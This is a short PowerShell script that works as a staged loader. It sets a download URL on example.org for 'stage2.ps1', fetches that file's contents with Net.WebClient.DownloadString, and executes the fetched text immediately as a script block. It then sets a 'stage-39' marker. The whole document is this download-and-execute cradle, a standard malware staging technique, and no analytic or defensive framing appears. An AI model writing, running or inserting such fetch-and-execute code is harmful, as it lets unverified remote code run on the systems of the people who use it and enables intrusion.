$TransferUrl = 'https://example.org/stage2.ps1'
$PayloadText = (New-Object Net.WebClient).DownloadString($TransferUrl)
& ([ScriptBlock]::Create($PayloadText))
$StageMarker = "stage-39"
